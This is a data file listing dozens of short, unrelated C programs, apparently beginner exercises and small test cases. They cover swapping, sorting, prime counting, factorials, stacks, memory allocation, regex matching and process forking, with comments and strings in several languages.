    "#include <stdio.h>\n#include <string.h>\n#include <stdlib.h>\nvoid swap(int *a, int *b)\n{\n    int c = *a;\n    *a = *b;\n    *b = c;\n}\nvoid swapv(int a, int b)\n{\n    int c = a;\n    a = b;\n    b = c;\n    printf(\"A = %d & B = %d\\n\", a, b);\n}\nint main()\n{\n    int a, b;\n    printf(\"Enter the value of A: \");\n    scanf(\"%d\",&a);\n    printf(\"Enter the value of B: \");\n    scanf(\"%d\",&b);\n    swapv(a, b);\n    swap(&a, &b);\n    printf(\"A = %d & B = %d\\n\", a, b);\n    return 0;\n}",
    "\n\n\n\n\nint main (int argc, char const *argv[]) {\n\n\n\n  return 0;\n\n}",
    "#include <stdio.h>\nint main()\n{\n return 0;\n}",
    "#include <stdio.h>\nint main()\n{\n    int inscritos[10][3], cursos[4]={0,0,0,0};\n    float mediaIdade=0;\n    printf(\"Inscri\u00e7\u00e3o para o vestibular\\n\\n\");\n    for(int i=0;i<10;i++){\n        cpf:\n        printf(\"\\nCANDIDATO %i\\n\",i+1);\n        printf(\"Informe o CPF: \");\n        scanf(\"%i\",&inscritos[i][0]);\n        for(int j=0;j<i;j++){\n           if(inscritos[i][0]==inscritos[j][0]){\n               printf(\"CANDIDATO J\u00c1 CADASTRADO!!\\nPOR FAVOR, INSIRA OUTRO CANDIDATO\\n\");\n               goto cpf;\n           }\n        }\n        printf(\"Informe a idade: \");\n        scanf(\"%i\",&inscritos[i][1]);\n        mediaIdade += inscritos[i][1];\n        do{\n            printf(\"Informe o curso (1-ADS; 2-GECOM; 3-Eventos; 4-RH): \");\n            scanf(\"%i\",&inscritos[i][2]);\n            if(inscritos[i][2]<1 || inscritos[i][2]>4){\n                printf(\"CURSO INV\u00c1LIDO!\\n\\n\");\n            }else{\n                switch(inscritos[i][2]){\n                    case 1:{\n                        cursos[0]++;\n                        break;\n                    }\n                    case 2:{\n                        cursos[1]++;\n                        break;\n                    }\n                    case 3:{\n                        cursos[2]++;\n                        break;\n                    }\n                    case 4:{\n                        cursos[3]++;\n                        break;\n                    }\n                }\n            }\n        }while(inscritos[i][2]<1 || inscritos[i][2]>4);\n    }\n    printf(\"\\n==================================\\n\");\n    printf(\"TOTAIS DE INSCRITOS\\n\");\n    printf(\"1-ADS: %i\\n\", cursos[0]);\n    printf(\"2-GECOM: %i\\n\", cursos[1]);\n    printf(\"3-Eventos: %i\\n\", cursos[2]);\n    printf(\"4-RH: %i\\n\", cursos[3]);\n    printf(\"\\nIDADE M\u00c9DIA DOS CANDIDATOS: %.1f\", mediaIdade/10);\n}",
    "#include <stdio.h>\nint main(){\n    int controle, senha, teste;\n    senha = 2002;\n    controle = 1;\n    while(controle){\n        scanf(\"%d\", &teste);\n        if(teste == senha){\n            printf(\"Acesso Permitido\\n\");\n            break;\n        }\n        else{\n            printf(\"Senha Invalida\\n\");\n            continue;\n        }\n    }\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main()\n{\n    int a,b;\n    printf(\"Enter 2 numbers(a and b): \");\n    scanf(\"%d%d\",&a,&b);\n    if (b%a==0)\n        printf(\"\\n%d(b) is divisible by %d(a).\\n\",b,a);\n    else\n        printf(\"\\n%d(b) is not divisible by %d(a).\\n\",b,a);\n    return 0;\n}",
    "#include <stdio.h>\nint main(int argc, char *argv[])\n{\n char line[81];\n while(fgets(line, 81, (stdin)) != ((void*)0))\n  puts(line);\n printf(\"hello\");\n return 0;\n}",
    "#include <stdio.h>\nint main()\n{\n int t, n;\n char ch;\n scanf(\"%d\", &t);\n getchar();\n while(t--){\n  scanf(\"%c %d\", &ch, &n);\n  getchar();\n  if('a'<=ch && 'z'>=ch) printf(\"%d\\n\", n-(ch-96));\n  else printf(\"%d\\n\", n+(ch-64));\n }\n return 0;\n}",
    "#include <stdio.h>\n#include <math.h>\n\n\nint primecount(int);\nint isprime(int);\nint main(int argc, char * argv[]) {\n    char fn_in[30 +1];\n    FILE * fin, * fout;\n    int v;\n    scanf(\"%s\", fn_in);\n    if(fin = fopen(fn_in, \"r\")) {\n        if(fout = fopen(\"primi.txt\", \"w\")) {\n            while(fscanf(fin, \"%d\", &v) == 1)\n                fprintf(fout, \"%d %d\\n\", v, primecount(v));\n            fclose(fin);\n            fclose(fout);\n        } else {\n            fclose(fin);\n            printf(\"Errore apertura file output.\\n\");\n        }\n    } else {\n        printf(\"Errore apertura file input.\\n\");\n    }\n    return 0;\n}\nint primecount(int n) {\n    int count, i;\n    count = 0;\n    for(i=2; i<=n; i++){\n        count += isprime(i);\n        printf(\"%d is prime? %d\\n\", i, isprime(i));\n    }\n    return count;\n}\nint isprime(int n) {\n    int sqrt_n, i, prime;\n    if(n<2) {\n        return 0;\n    } else if(n == 2) {\n        return 1;\n    } else if(n%2 == 0) {\n        return 0;\n    } else {\n        prime = 1;\n        sqrt_n = sqrt(n);\n        for(i=3; (i<=sqrt_n) && prime; i+=2) {\n            if(n%i == 0)\n                prime = 0;\n        }\n        return prime;\n    }\n}",
    "#include<stdio.h>\n\nint hammingWeight(unsigned n) {\n  int i = 0;\n  while(n) {\n    if (n&1) i++;\n    n >>= 1;\n  }\n  return i;\n}\nvoid test(unsigned n) {\n  printf(\"%d, %d\\n\", n, hammingWeight(n));\n}\nint main(void) {\n  test(11);\n}",
    "#include <stdio.h>\nint main()\n{\n    const float PI=3.14;\n    float r,sonuc;\n    printf(\"r sayi giriniz: \");\n    scanf(\"%f\",&r);\n    sonuc=PI*(r*r);\n    printf(\"sonuc: %.3f\",sonuc);\n    return 0;\n}",
    "#include<stdio.h>\nint main(void){\n int n, i, j;\n int aux;\n scanf(\"%d\",&n);\n int vetor[n], vetor2[n];\n for (i=0; i<n; i++){\n  scanf(\"%d\", vetor+i);\n }\n for (i=0; i<n; i++){\n                scanf(\"%d\", vetor2+i);\n        }\n for(aux=0; aux<n; aux++){\n  int total= *(vetor+aux) + *(vetor2+aux);\n  printf(\"%d \", total);\n  aux++;\n }\n printf(\"\\n\");\nreturn 0;\n}",
    "#include<stdio.h>\n#include<ctype.h>\nint count_words(char *str);\nint main(void)\n{\n char str[50]=\" blue green  red  \";\n printf(\"Number of words in string = %d\\n\",count_words(str));\n return 0;\n}\nint count_words(char *str)\n{\n int count=0;\n while(*str!='\\0')\n {\n  while(__isspace(*str))\n   str++;\n  if(*str=='\\0')\n   return count;\n  while(!__isspace(*str) && *str!='\\0')\n  {\n   putchar(*str);\n   str++;\n  }\n  count++;\n  printf(\"\\n\");\n }\n return count;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main()\n{\n  float commission_order, salesPrice, cost_fee, rate_charge;\n  printf(\"How would you rate our employees?\\n\");\n  scanf(\"%f\", &rate_charge);\n  printf(\"Okay, you rated our employees with %f stars\\n\", rate_charge);\n  printf(\"I would also ask, what is the sales price?\\n\");\n  scanf(\"%f\", &salesPrice);\n  printf(\"Alright, I have to ask what is the cost?\\n\");\n  scanf(\"%f\", &cost_fee);\n  printf(\"Yeah, I feel you. Fair enough.\\n\");\n  printf(\"Okay so the commission for the merchent is %f\", commission_order = rate_charge*(salesPrice - cost_fee));\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main (){\n    int *v, n;\n    printf(\"escreva um tamanho para um vetor: \");\n    scanf(\"%i\",&n);\n    v= malloc (n*sizeof(int));\n    free(v);\n    return 0;\n}",
    "#include <stdio.h>\n#include <sys/types.h>\n#include <regex.h>\nint main(int argc, char *argv[])\n{\n    int ret, status;\n    regex_t re;\n    if (argc < 2 ) {\n        printf(\"required re and string\\n\");\n        return 0;\n    }\n    printf(\"pattern:%s input %s\\n\", argv[1], argv[2]);\n    char *pattern = argv[1];\n    if (regcomp(&re, pattern, 1|8) != 0) {\n        printf(\"Fail to compile re\");\n    }\n    status = regexec(&re, argv[2], 0, ((void*)0), 0);\n    regfree(&re);\n    if (status == 0)\n        printf(\"Match!!\\n\");\n    else\n        printf(\"Not Match!!\\n\");\n    return 0;\n}",
    "#include <stdio.h>\nint main()\n{\n char c;\n while ((c = getchar()) != '.')\n {\n  printf(\"You love \");\n  switch (c)\n  {\n  case 'a':\n  case 'A':\n   printf(\"apple\");\n   break;\n  case 'b':\n  case 'B':\n   printf(\"baseball\");\n   break;\n  case 'c':\n  case 'C':\n   printf(\"cake\");\n   break;\n  default:\n   printf(\"nothing\");\n   break;\n  }\n  printf(\".\\n\");\n  while (getchar() != '\\n')\n   continue;\n }\n return 0;\n}",
    "int main() {\n    int a = 42;\n    return a;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <time.h>\nint main() {\n srand(time(0));\n int number = rand()%100+1;\n int count = 0;\n int a = 0;\n printf(\"Guessing a number form 1~100.\");\n do {\n  printf(\"\\nNumber:\");\n  scanf(\"%d\", &a);\n  count ++;\n  if ( a > number ) {\n   printf(\"More\");\n  } else if (a < number) {\n   printf(\"Less\");\n  }\n } while (a != number);\n printf(\"Great,You Win!\\nYou guess %d times.\", count);\n return 0;\n}",
    "#include <stdio.h>\nvoid inComment();\nint inDoubleQuote(int c);\nint inSingleQuote(int c);\nint inBrace();\nint inBracket();\nint main(){\n    int c;\n    int error_found = 0;\n    while(!error_found && (c=getchar())!= (-1)){\n        if(c == '/'){\n            if(c == '*')\n                inComment();\n            else{\n                error_found = 1;\n                break;\n            }\n        }\n        else if(c == '\"')\n            error_found = inDoubleQuote(c);\n        else if(c == '\\'')\n            error_found = inSingleQuote(c);\n        else if(c == '{')\n            error_found = inBrace();\n        else if(c == '}')\n            error_found = 1;\n        else if(c == '(')\n            error_found = inBracket();\n        else if(c == ')')\n            return 1;\n    }\n    printf(\"Error found: %d\", error_found);\n    return 0;\n}\nvoid inComment(){\n    int c, d;\n    while((c=getchar()) != (-1) && (d=getchar())!= (-1) && c!= '*' && d!= '/')\n        ;\n}\nint inDoubleQuote(int c){\n    int d;\n    while((d=getchar())!= (-1)){\n        if(d == '\\\\')\n            getchar();\n        if(d == c){\n            return 1;\n        }\n    }\n    return 0;\n}\nint inSingleQuote(int c){\n    int d;\n    while((d=getchar())!= (-1)){\n        if(d == '\\\\')\n            getchar();\n        if(d == c){\n            return 1;\n        }\n    }\n    return 0;\n}\nint inBrace(){\n    int c, invalid = 0;\n    while((c=getchar()) != (-1)){\n        if(c == '{'){\n            invalid = inBrace();\n        }\n        else if(c == '}'){\n            return 0;\n        }\n    }\n    return 1;\n}\nint inBracket(){\n    int c, invalid = 0;\n     while((c=getchar()) != (-1)){\n        if(c == '('){\n            invalid = inBracket();\n        }\n        else if(c == ')'){\n            return 0;\n        }\n    }\n    return 1;\n}",
    "\nint main()\n{\n  int i;\n  int a[10];\n  int k = 1;\n  int s = 0;\n  for (i = 0; i <10; i++)\n    {\n      a[i] = k;\n    }\n  for (i = 0; i <10; i++)\n    {\n      s = s+a[i];\n    }\n  return s;\n}",
    "#include <stdio.h>\n#include <stdint.h>\n\nint main()\n{\n   uint16_t x[21], x2[21], x3[21];\n   printf(\"x \\tx al cuadrado \\tx al cubo\\r\\n\");\n   uint8_t i;\n   for( i=0; i<=20; i++ ){\n      x[i] = i;\n      x2[i] = i*i;\n      x3[i] = i*i*i;\n   }\n   for( i=0; i<=20; i++ ){\n      printf(\"%d \\t%d \\t\\t%d\\r\\n\", x[i], x2[i], x3[i] );\n   }\n   printf(\"\\r\\n\\n%d \\t%d \\t\\t%d\\r\\n\", x[5], x2[5], x3[5] );\n   return 0;\n}",
    "#include <stdio.h>\n#include <string.h>\nint a;\nchar str[31] = \"\";\nint main() {\n    printf(\"%s\\n\" , \"Skol'ko bydet 2+2*2*5\\nVarianti:\\n1)40\\n2)25\\n3)22\");\n    scanf(\"%d\", &a);\n    if (a==3) {\n        printf(\"%s\\n\" , \"RIGHT\");\n    }\n    else\n    {\n        printf(\"%s\\n\" , \"NOT RIGNT\");\n        }\n   printf(\"%s\\n\" , \"Igraem dal'she?\");\n    scanf (\"%s30\" , str);\n    if (!strcmp(str , \"da\")) {\n    printf(\"%s\\n\" , \"ny horosho\");\n    } else {\n        printf(\"%s\\n\" , \"ny kak hochesh\");\n    }\n    return 0;\n}",
    "#include <stdio.h>\nint main () {\n int T, m, n, i, mini;\n scanf (\"%d\", &T);\n while (T--) {\n  scanf (\"%d %d %d\", &m, &n, &i);\n  printf (\"%d %d\\n\", n+i*m, i);\n }\n return 0;\n}",
    "#include <stdio.h>\nvoid func1()\n{\n    int var = 10;\n    printf (\"func1: %d\\n\", var);\n}\nint main()\n{\n    int var = 5;\n    printf (\"main: %d\\n\", var);\n    func1();\n    printf (\"main: %d\\n\", var);\n    return 0;\n}",
    "#include <math.h>\n#include <stdio.h>\ndouble fac(unsigned int n)\n{\n    return n <= 1 ? 1 : n * fac(n - 1);\n}\ndouble e_x(unsigned int x)\n{\n    double r = 0, r_tmp, k = 0;\n    do\n    {\n        r_tmp = r;\n        r += pow(x, k) / fac(k);\n        k++;\n    } while (r != r_tmp);\n    return r;\n}\nint main()\n{\n    printf(\"%.16f\\n\", e_x(2));\n    return 0;\n}",
    "#include<stdio.h>\nint main(void)\n{\n    int a[10] = {27, 13, 5, 32, 23, 3, 17, 43, 55, 39};\n    void sort(int [],int);\n    int i;\n    sort(a,10);\n    for(i = 0; i < 10; i++)\n       printf(\"%6d\",a[i]);\n    printf(\"\\n\");\n    return 0;\n}\nvoid sort(int b[], int n)\n{\n    int i, j, t;\n    for (i = 0; i < n - 1; i++)\n        for ( j = 0; j < n - i - 1; j++)\n         if(b[j] > b[j+1])\n            t = b[j], b[j] = b[j+1], b[j+1] = t;\n}",
    "#include <stdio.h>\nint main(){\n    double r,R;\n    while(scanf(\"%lf\",&r)!=(-1)){\n        R=r*9.0/5.0+32;\n        printf(\"%g\",R);\n        putchar('\\n');\n    }\n}",
    "#include <stdio.h>\nint n, T;\nint a[40];\nint sum = 0, count = 0;\nvoid find(int num)\n{\n    if(num == n + 1)\n    {\n        count++;\n        return;\n    }\n    if(sum + a[num] <= T)\n    {\n        sum = sum + a[num];\n        find(num+1);\n        sum = sum - a[num];\n    }\n    find(num+1);\n    return;\n}\nint main()\n{\n    scanf(\"%d %d\", &n, &T);\n    for(int i = 1; i <= n; i++)\n        scanf(\"%d\", &a[i]);\n    find(1);\n    printf(\"%d\", count);\n    return 0;\n}",
    "#include <stdio.h>\n#include <time.h>\n#include <stdlib.h>\nint main()\n{\n    int cartelas;\n    int i = 0;\n    int j = 0;\n    int equal = 0;\n    int vectorA[10];\n    srand(time(((void*)0)));\n    printf(\"Hello, world.\\n\");\n    do\n    {\n        vectorA[i] = rand() % 100;\n        equal = 0;\n        for ( j=0; j<i; j++)\n        {\n            if ( vectorA[j] == vectorA[i])\n                equal = 1;\n        }\n        if ( equal == 0)\n            i++;\n    }while( i < 10);\n    printf(\"Your vector: \");\n    for (i=0; i<10; i++)\n    {\n        printf(\"%i \", vectorA[i]);\n    }\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\nint main(int argc, char *argv[])\n{\n    int status;\n    pid_t pid;\n    int i = 0;\n    pid=fork();\n    if(pid < 0){\n        return -1;\n    }\n    else if(pid == 0){\n        while(1){\n            printf(\"Sono il processo figlio: %d\\n\",++i);\n            sleep(1);\n        }\n    }\n    else{\n        sleep(8);\n        printf(\"Sono il processo padre e sto terminando!\\n\");\n        exit(0);\n    }\n}",
    "extern int volatile test;\nint volatile test = 0;\nint main() { return 0; }",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <time.h>\nint main() {\n  int segundos = time(0);\n  srand(segundos);\n  int n1 = rand();\n  int n2 = rand();\n  printf(\"%d %d\\n\", n1, n2);\n}",
    "#include <stdio.h>\nint main()\n{\n    char opcion;\n    int arreglo[] = {2, 4, 6, 8, 10, 12, 14, 16, 18, 20};\n    printf(\"%s\\n%s\\n%s\\n\",\n        \"Este programa muestra los numeros pares del 2 al 20.\",\n        \"Ingrese la opcion 'a' si desea ver los numeros de forma 'ascendente'.\",\n        \"Ingrese la opcion 'd' si desea ver los numeros de forma 'descendente'.\");\n    do\n    {\n        printf(\"Ingrese una opcion: \");\n        fflush((stdin)); scanf(\"%c\", &opcion); fflush((stdin));\n        if (opcion != 'a' && opcion != 'd')\n            printf(\"\\nLa opcion ingresada es incorrecta. \");\n    }while (opcion != 'a' && opcion != 'd');\n    if (opcion == 'a')\n    {\n        for (int i = 0; i < 10; i++)\n            printf(\"%d\\n\", arreglo[i]);\n    } else if (opcion == 'd')\n    {\n        for (int i = 9; i >= 0; i--)\n            printf(\"%d\\n\", arreglo[i]);\n    }\n    return 0;\n}",
    "typedef int wchar_t;\nint main(int argc, char **argv) {\n    const char *astr = \"a\";\n    const wchar_t wide = L'a';\n    const wchar_t *pu_umlaut = L\"\\u00FC\";\n}",
    "#include<stdio.h>\n\n\nint N(int, int);\nint M(int, int);\nint H(int, int);\nint a[100], n, l, r;\nint main()\n{\n int K, x, y;\n scanf (\"%d%d\", &n, &K);\n for(int i=0;i<n;i++){\n  scanf (\"%d\", &a[i]);\n }\n for(int i=0;i<K;i++){\n  scanf (\"%d%d\", &l, &r);\n  x=N(l, r);\n  y=M(l, r);\n  printf (\"%d\\n\", H(x<y?x:y, x>y?x:y));\n }\n return 0;\n}\nint N(int l, int r)\n{\n int sum=0;\n for (int i=l;i<=r;i++){\n  sum+=(a[i]%n);\n }\n return sum%n;\n}\nint M(int l,int r)\n{\n int mul=1;\n for (int i=l;i<=r;i++){\n  mul=(mul*a[i])%n;\n }\n return mul%n;\n}\nint H(int min, int max)\n{\n int res=a[min];\n for (int i=min+1;i<=max;i++){\n  res=res^a[i];\n }\n return res;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main(int argc, char *argv[] ){\n    int n1,n2,n3;\n    n1 = atoi( argv[1] );\n    n2 = atoi( argv[2] );\n    n3 = n1 + n2;\n    printf(\"Toplam: %d/n\", n3 );\n    getchar();\n   return 0;\n  }",
    "#include <stdio.h>\n#include <stdlib.h>\nint fatorial(int num)\n{\n    int result;\n    if (num == 0)\n    {\n        return 1;\n    }\n    else\n    {\n        result = num * (fatorial(num - 1));\n    }\n    return result;\n}\nint main()\n{\n    int num;\n    scanf(\"%d\", &num);\n    int res = fatorial(num);\n    printf(\"%d\", res);\n}",
    "#include <stdio.h>\nint main(){\n    int n, i, pa, pb, cont=0;\n    double ca, cb;\n    scanf(\"%d\", &n);\n    for(i=0;i<n;i++){\n        cont=0;\n        scanf(\"%d %d %lf %lf\", &pa, &pb, &ca, &cb);\n        while(pa <= pb){\n            cont++;\n            pa += ((pa*ca)/100);\n            pb += ((pb*cb)/100);\n            if(cont > 100){\n                printf(\"Mais de 1 seculo.\\n\");\n                break;\n            }\n        }\n        if(cont <= 100)\n            printf(\"%d anos.\\n\", cont);\n    }\nreturn 0;\n}",
    "#include <stdio.h>\nint main(void)\n{\n int n, fact_i = 1;\n float e = 1.0;\n printf(\"Enter an integer (the higher the better the approximation to e): \");\n scanf(\"%d\", &n);\n for (int i = 1; i <= n; i++)\n {\n  fact_i *= i;\n  e += 1.0/fact_i;\n }\n printf(\"The approximation of e is %.6f\\n\", e);\n return 0;\n}",
    "void printf();\nint main() {\n  printf(\"%d %d %d %d %d\\n\", 5 / 2, 100 % 3, -10 / 3, -15 % 2, 10 % 5);\n  return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main()\n{\n int * ptr;\n ptr=(int *)malloc(sizeof(int));\n if(ptr != ((void*)0))\n        {\n        *ptr=200;\n        printf(\"The pointer value is %d \\n\", *ptr);\n        }\n else {\n        printf(\"Memory allocation is not successful\");\n        }\nreturn 0;\n}",
    "#include <stdio.h>\nint main() {\n    int n,i,j,tmp;\n    printf(\"enter number of elemments\\n\");\n    scanf(\"%d\",&n);\n    int a[n];\n    printf(\"enter elements\\n\");\n    for(i=0;i<n;i++)\n        scanf(\"%d\",&a[i]);\n    for( i=1;i<n;i++)\n    {\n        tmp=a[i];\n        j=i-1;\n        while(j>=0&&a[j]>tmp)\n        {\n            a[j+1]=a[j];\n            j--;\n        }\n        j++;\n        a[j]=tmp;\n    }\n    for(i=0;i<n;i++)\n        printf(\"%d \",a[i]);\n}",
    "#include <stdio.h>\nvoid function_add_numbers(int a, int b, int c);\nint function_add_numbers_return(int a, int b, int c);\nint main(){\n int value = 2;\n function_add_numbers(3, 5, value);\n printf(\"sum: %d\\n\", function_add_numbers_return(3, 5, value));\n return 0;\n}\nvoid function_add_numbers(int a, int b, int c){\n int sum;\n sum = a + b + c;\n printf(\"sum: %d\\n\", sum);\n}\nint function_add_numbers_return(int a, int b, int c){\n int sum;\n sum = a + b + c;\n return sum;\n}",
    "#include <stdio.h>\n\nint inverte(int V[], int n){\n    int i,j,inv=0;\n    for (i=0; i < n-1; i++){\n        for (j = i + 1; j < n; j++){\n            if(V[i] > V[j])\n                inv++;\n        }\n    }\n    return inv;\n}\nint main(){\n    int V[10000];\n    int n,i=0,k,j=0;\n    scanf(\"%d\",&k);\n    for(j=0; j < k; j++){\n        scanf(\"%d\",&n);\n        for (i = 0; i < n; i++)\n            scanf(\"%d\",&V[i]);\n        printf(\"%d\\n\",inverte(V,n));\n    }\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main()\n{\n    float p;\n    printf(\"Enter percentage: \");\n    scanf(\"%f\",&p);\n    if (p>=75.0)\n        printf(\"\\nDivision acquired is DISTINCTION.\\n\");\n    else if (p>=60.0 && p<75.0)\n        printf(\"\\nDivision acquired is FIRST DIVISION.\\n\");\n    else if (p>=45.0 && p<60.0)\n        printf(\"\\nDivision acquired is SECOND DIVISION.\\n\");\n    else if (p>=32.0 && p<45.0)\n        printf(\"\\nDivision acquired is THIRD DIVISION.\\n\");\n    else\n        printf(\"\\nHe/She has failed.\\n\");\n    return 0;\n}",
    "#include <stdio.h>\nint main(void) {\n    int N;\n    scanf(\"%d\", &N);\n    int rabbit = 0, rat = 0, frog = 0, total = 0;\n    int ammount;\n    while (N != 0) {\n        char name;\n        scanf(\"%d %c\", &ammount, &name);\n        if (name == 'C')\n            rabbit += ammount;\n        else if (name == 'R')\n            rat += ammount;\n        else if (name == 'S')\n            frog += ammount;\n        N--;\n    }\n    total = (rabbit + rat + frog);\n    printf(\"Total: %d cobaias\\n\", total);\n    printf(\"Total de coelhos: %d\\n\", rabbit);\n    printf(\"Total de ratos: %d\\n\", rat);\n    printf(\"Total de sapos: %d\\n\", frog);\n    printf(\"Percentual de coelhos: %.2f %%\\n\", ((double) rabbit / total) * 100.00);\n    printf(\"Percentual de ratos: %.2f %%\\n\", ((double) rat / total) * 100.00);\n    printf(\"Percentual de sapos: %.2f %%\\n\", ((double) frog / total) * 100.00);\n    return 0;\n}",
    "#include <stdio.h>\n\nint main(void){\n    int i, a[10] = {1, 2, 3, 4, 5};\n    for(i=0; i<10; i++){\n        a[i] = 0;\n    }\n    for (i=0; i<10; i++){\n        printf(\"%d\\n\", a[i]);\n    }\n    return 0;\n}",
    "#include <stdio.h>\ndouble factorial(unsigned int i) {\n    if (i <= 1) {\n        return 1;\n    }\n    return i * factorial(i - 1);\n}\nint main() {\n    int i = 15;\n    printf(\"%d \u7684\u9636\u4e58\u4e3a %f\\n\", i, factorial(i));\n    return 0;\n}",
    "#include <unistd.h>\nint main() {\n    pause();\n}",
    "#include<stdio.h>\n#include<limits.h>\nint main(){\n printf(\"CHAR_BIT = %d\\n\", 8);\n printf(\"CHAR_MAX = %d\\n\", 127);\n printf(\"CHAR_MIN = %d\\n\", (-127 -1));\n printf(\"SCHAR_MAX = %d\\n\", 127);\n printf(\"SCHAR_MIN = %d\\n\", (-127 -1));\n printf(\"INT_MAX = %d\\n\", 2147483647);\n printf(\"INT_MIN = %d\\n\", (-2147483647 -1));\n printf(\"UINT_MAX = %u\\n\", (2147483647 *2U +1U));\n printf(\"LONG_MAX = %d\\n\", 2147483647L);\n printf(\"LONG_MIN = %d\\n\", (-2147483647L -1L));\n printf(\"ULONG_MAX = %u\\n\", (2147483647L *2UL+1UL));\n return 0;\n}",
    "#include <stdio.h>\nint main() {\n int inteiro = 1;\n float decimal = 6.1f;\n char caractere1 = 'g';\n char *caractere2 = \"k\";\n printf(\"O valor inteiro e %i\\n\", inteiro);\n printf(\"O valor decimal e %f\\n\", decimal);\n printf(\"O caractere1 e %c\\n\", caractere1);\n printf(\"O caractere2 e %c\\n\\n\", caractere2);\n printf(\"O valor inteiro e %i\\n\", &inteiro);\n printf(\"O valor decimal e %f\\n\", &decimal);\n printf(\"O caractere1 e %c\\n\", &caractere1);\n printf(\"O caractere2 e %c\\n\\n\", &caractere2);\n printf(\"O caractere2 e %s\\n\", caractere2);\n printf(\"O valor inteiro (somado para dar algo imprim\u00edvel) mostrado como caractere e %c\\n\", inteiro + 64);\n printf(\"O endereco de decimal e %d\\n\", &decimal);\n printf(\"O inicio do caractere2 e %c\\n\", caractere2[0]);\n}",
    "#include<stdio.h>\nint main(){\nint a,kyb,kvadrat;\nprintf(\"\\n\");\nscanf(\"%d\",&a);\nkvadrat=a*a;\nkyb=a*a*a;\nprintf(\"%d\\n\",kvadrat);\nprintf(\"%d\\n\",kyb);\nreturn 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main()\n{\n int a[5], i;\n printf(\"Enter 5 elements\\n\");\n for(i = 0; i < 5; i++)\n {\n  scanf(\"%d\", &a[i]);\n }\n int t = a[4];\n for(i = 3; i >= 0; i--)\n {\n  a[i+1] = a[i];\n }\n a[0] = t;\n for(i = 0; i < 5; i++)\n {\n  printf(\"%d\", a[i]);\n }\n printf(\"\\n\");\n return 0;\n}",
    "#include <stdio.h>\n#include <sys/types.h>\n#include <sys/stat.h>\nint main(int argc, char *argv[]) {\n  if (argc<2) {\n    fprintf((stderr),\"\u4f7f\u7528\u65b9\u6cd5: %s directory ...\\n\", argv[0]);\n    return 1;\n  }\n  int err = 0;\n  for (int i=1; i<argc; i++) {\n    if (mkdir(argv[i],0755)<0) {\n      perror(argv[i]);\n      err = 1;\n    }\n  }\n  return err;\n}",
    "#include <stdio.h>\nint main() {\n    int lucky;\n    scanf(\"%d\", &lucky);\n    for (int i = 0; i <= 10; i++) {\n        printf(\"%d x 2 = %d \\n\", lucky, lucky * i);\n    }\n}",
    "#include <stdio.h>\nint main() {\n    int *a[1];\n    int a_value = 1;\n    a[0] = &a_value;\n    int (*b)[];\n    int b_value[1];\n    b = &b_value;\n    char *(*(**foo[3][2])())[];\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n\n\nint stack[10000];\nint top = -1;\nvoid push(int data) {\n    if (top == 10000 - 1) {\n        printf(\"Stack overflow has occurred\\n\");\n        return;\n    }\n    stack[++top] = data;\n}\nint pop() {\n    if (top == -1) {\n       printf(\"Stack underflow has occurred\\n\");\n       return -99999999;\n    }\n    return stack[top--];\n}\nvoid show() {\n    printf(\"--- Top of Stack ---\\n\");\n    for (int i = top; i >= 0; i--) {\n        printf(\"%d\\n\", stack[i]);\n    }\n    printf(\"--- Bottom of Stack ---\\n\");\n}\nint main(void) {\n    push(7);\n    push(5);\n    push(4);\n    pop();\n    push(6);\n    pop();\n    show();\n    return 0;\n}",
    "#include<stdio.h>\nint main()\n{\n int fragments[10], blocks[10], files[10];\n int m, n, number_of_blocks, number_of_files, temp, top = 0;\n static int block_arr[10], file_arr[10];\n printf(\"\\n------------------------------------------------------------------------------------------------\\n\");\n    printf(\"\\n \\t\\t\\t\\tMemory Management Scheme - Worst-Fit\\n\");\n    printf(\"\\n------------------------------------------------------------------------------------------------\\n\");\n printf(\"\\n Enter the Total Number of Blocks : \");\n scanf(\"%d\",&number_of_blocks);\n printf(\"\\n------------------------------------------------------------------------------------------------\\n\");\n printf(\"\\n Enter the Total Number of Process : \");\n scanf(\"%d\",&number_of_files);\n printf(\"\\n------------------------------------------------------------------------------------------------\\n\");\n printf(\"\\n Enter the Size of the Blocks : \\n\");\n for(m = 0; m < number_of_blocks; m++)\n {\n  printf(\" Block No. [%d] : \", m + 1);\n  scanf(\"%d\", &blocks[m]);\n }\n printf(\"\\n------------------------------------------------------------------------------------------------\\n\");\n printf(\"\\n Enter the Size of the Process : \\n\");\n for(m = 0; m < number_of_files; m++)\n {\n  printf(\" Process No. [%d] : \", m + 1);\n  scanf(\"%d\", &files[m]);\n }\n printf(\"\\n------------------------------------------------------------------------------------------------\\n\");\n for(m = 0; m < number_of_files; m++)\n {\n  for(n = 0; n < number_of_blocks; n++)\n  {\n   if(block_arr[n] != 1)\n   {\n    temp = blocks[n] - files[m];\n    if(temp >= 0)\n    {\n     if(top < temp)\n     {\n      file_arr[m] = n;\n      top = temp;\n     }\n    }\n   }\n   fragments[m] = top;\n   block_arr[file_arr[m]] = 1;\n  }\n  top = 0;\n }\n printf(\"\\n Process_no.\\tProcess Size\\tBlock Number\\tBlock Size\\tFragment\\n\");\n    for(m = 0; m < number_of_files; m++)\n    {\n        printf(\"\\n  %d\\t\\t%d\\t\\t%d\\t\\t%d\\t\\t%d\\n\\n\", m+1, files[m], file_arr[m]+1,blocks[file_arr[m]],fragments[m]);\n    }\n printf(\"\\n------------------------------------------------------------------------------------------------\\n\");\n return 0;\n}",
